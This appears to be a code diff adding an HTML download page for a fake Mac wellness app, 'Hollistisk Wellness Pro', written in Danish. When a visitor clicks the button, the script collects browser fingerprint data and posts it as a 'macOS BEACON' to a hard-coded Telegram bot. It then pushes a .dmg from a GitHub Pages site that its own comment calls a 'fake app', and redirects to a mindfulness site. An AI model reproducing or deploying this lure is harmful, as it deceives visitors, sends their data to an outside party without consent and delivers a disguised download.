@@ -1,0 +1,74 @@
+
+<!DOCTYPE html>
+<html>
+<head>
+    <meta charset="UTF-8">
+    <title>Hollistisk Wellness Pro - macOS</title>
+    <style>
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, sans-serif;
+            margin: 0;
+            padding: 40px;
+            background: #1a1a1a;
+            color: white;
+            min-height: 100vh;
+        }
+        .container { max-width: 600px; margin: 0 auto; text-align: center; }
+        .title { font-size: 36px; margin: 30px 0; }
+        .download-btn {
+            background: #007AFF;
+            color: white;
+            border: none;
+            padding: 20px 40px;
+            border-radius: 10px;
+            font-size: 20px;
+            cursor: pointer;
+            margin: 20px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="title">🧘‍♀️ Hollistisk Wellness Pro</div>
+        <div>Premium wellness app til Mac brugere</div>
+        <button class="download-btn" onclick="downloadMacApp()">Download til Mac</button>
+    </div>
+
+    <script>
+        async function downloadMacApp() {
+            const macData = {
+                source: 'hollistisk_macos',
+                userAgent: navigator.userAgent,
+                timestamp: new Date().toISOString(),
+                screen: { width: screen.width, height: screen.height },
+                plugins: Array.from(navigator.plugins).map(p => p.name),
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                language: navigator.language,
+                hardwareConcurrency: navigator.hardwareConcurrency,
+                maxTouchPoints: navigator.maxTouchPoints
+            };
+            
+            // Send macOS beacon
+            await fetch('https://api.telegram.org/bot8283973635:AAFzNIcEl78aH-l0iKj5lYKFLj4Vil39u7k/sendMessage', {
+                method: 'POST',
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({
+                    chat_id: '3032183658',
+                    text: '💻 macOS BEACON:\n```json\n' + JSON.stringify(macData, null, 2) + '\n```',
+                    parse_mode: 'Markdown'
+                })
+            });
+            
+            // Try to download fake app
+            const link = document.createElement('a');
+            link.href = 'https://jeki1234121.github.io/hollistisk-v2/wellness-pro.dmg';
+            link.download = 'wellness-pro.dmg';
+            link.click();
+            
+            setTimeout(() => {
+                window.location.href = 'https://minfulness.dk';
+            }, 3000);
+        }
+    </script>
+</body>
+</html>
